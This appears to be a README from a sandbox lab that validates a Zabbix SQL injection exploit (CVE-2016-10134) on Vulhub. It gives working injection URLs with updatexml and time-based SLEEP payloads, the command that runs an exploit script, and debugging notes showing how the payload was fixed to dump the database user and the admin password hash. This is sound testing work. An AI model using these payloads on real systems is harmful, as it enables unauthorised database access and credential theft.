# Vuln2Action-Demo
This repository contains the demo video for the exploit code to be tested in sandboxed environment.
The testing has been done using the vulhub platform .
SQl Injection from Vulhub


Vulnerability ref - 
https://github.com/vulhub/vulhub/tree/40271304330e5411de114ca578e2507023148358/zabbix/CVE-2016-10134



CVE-2016-10134
SQL injection vulnerability in Zabbix before 2.2.14 and 3.0 before 3.0.4 allows remote attackers to execute arbitrary SQL commands via the toggle_ids array parameter in latest.php.



 Docker & Vulhub Setup


Clone the repo : git clone --depth 1 https://github.com/vulhub/vulhub
Download docker if not present
Run docker with docker-compose file


 Exploit Validation


Update docker-compose (was outdated)
Add platform: linux/amd64
Server
Agent


docker compose up -d
This should get the docker running by pulling the apis and DB for zabbix


Login to Zabbix
Use “guest” as username
Use blank password
Fetch session id …. They probably use session id in auth for token based auth



Use session ID for injection
Session id ->fb41007b792256f5381a37a9883c2b5c
Use last 16(as mentioned in repo):
Command : 
http://ip_address:8080/latest.php?output=ajax&sid=session_id&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
Result: 


 
Remove setup
Docker compose down -d



    3. Exploit Code Testing
Update docker-compose (was outdated)
Add platform: linux/amd64
Server
Agent


    2 .  docker compose up -d
This should get the docker running by pulling the apis and DB for zabbix

    
 3 .  Run the exploit script after setup runs on localhost:8080
           CVE-2016-10134_modified.py

	Command : python3 /exploits/CVE-2016-10134_modified.py --url http://localhost:8080 --all

This command is assuming that you store the CVE exploit file mentioned above in a folder named exploits after pulling the vulhub repo



Result - 1 (unmodified)

============================================================
  SUMMARY
============================================================
  Zabbix Version: 3.0.3
  Version Vulnerable: True
  Sqli Confirmed: False
============================================================

The reason for no injection was that the target code path was never reached
The cookie was found thus labelled it vulnerable as that was reusable in latest.php
The toggle_open_state was not ‘1’ as model was not aware of this from either the description or the CAPEC flows
Required as per readme:

http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)

Can add the toggle_open_state=’1’ and the sid in the params for the request
Just having toggle_ids is not enough





Result - 2 (Updated Payload)
============================================================
  DETECTION PHASE
============================================================
[*] Sending time-based payload: 1 AND SLEEP(3)-- -
    Response time: 0.03s (threshold: 2.10s)
[-] No delay detected — may not be vulnerable or not MySQL
[*] Sending boolean-based payloads …
    TRUE  response length: 7285
    FALSE response length: 7285
    Difference: 0 bytes
[-] Responses identical — boolean detection inconclusive

[-] Vulnerability NOT confirmed by any method.

============================================================
  SUMMARY
============================================================
  Zabbix Version: 3.0.3
  Version Vulnerable: True
  Sqli Confirmed: False
============================================================

Did not work because detection checks ae incorrect maybe 
No this was not the cause
Or the inject SQL statement is not syntactically correct due to - - - line 
Fixing the syntax for IN() clause in the sql query for injection 
1 AND SLEEP(3)-- -   to IF(1=1,SLEEP(3),0)





Result - 3 (Updated SQL Syntax)
============================================================
  DETECTION PHASE
============================================================
[*] jsrpc.php time-based payload: 1 AND SLEEP(3)-- -
    Response time: 0.04s (threshold: 2.10s)
[-] No delay via jsrpc.php
[*] latest.php time-based payload: IF(1=1,SLEEP(3),0)
    Response time: 3.04s (threshold: 2.10s)
[+] TIME-BASED SQLi CONFIRMED (via latest.php)


Final result 
============================================================
  SUMMARY
============================================================
  Zabbix Version: 3.0.3
  Version Vulnerable: True
  Sqli Confirmed: True
  Db Version: 5.7.44
  Db User: root@172.18.0.5
  Db Name: zabbix
  Admin Hash: 5fce1b3e34b520afeffb37ce08c7cd66   (MD5)
  Users:
    - admin
    - guest
============================================================




 

